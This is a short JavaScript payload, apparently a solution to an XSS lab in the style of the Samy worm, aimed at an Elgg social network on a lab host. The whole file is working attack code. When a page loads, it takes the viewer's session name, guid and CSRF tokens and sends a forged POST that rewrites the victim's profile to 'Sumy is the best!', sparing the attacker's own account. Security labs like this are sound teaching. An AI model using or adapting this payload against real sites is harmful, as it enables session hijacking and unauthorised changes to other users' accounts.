window.onload = function(){
	var name = "&name="+elgg.session.user.name;	
	var guid="&guid="+elgg.session.user.guid;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;	
	var token="&__elgg_token="+elgg.security.token.__elgg_token;

//var desc="&description=&accesslevel[description]=2&briefdescription=Sumy+Is+The+Best&accesslevel[briefdescription]=2&location=&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&twitter=&accesslevel[twitter]=2"; //FILL IN
	var desc="&description=<p>Sumy is the best!</p> &accesslevel[description]=2&briefdescription=&accesslevel[briefdescription]=2&location=&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&twitter=&accesslevel[twitter]=2";
	var desc
	var content= token+ts+name+desc+guid; //FILL IN
	var sendurl = "http://www.xsslabelgg.com/action/profile/edit"; //FILL IN
	var samyGuid=47; //FILL IN
	
	if(elgg.session.user.guid!=samyGuid){
		var Ajax=null;

		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send(content);
	}
}
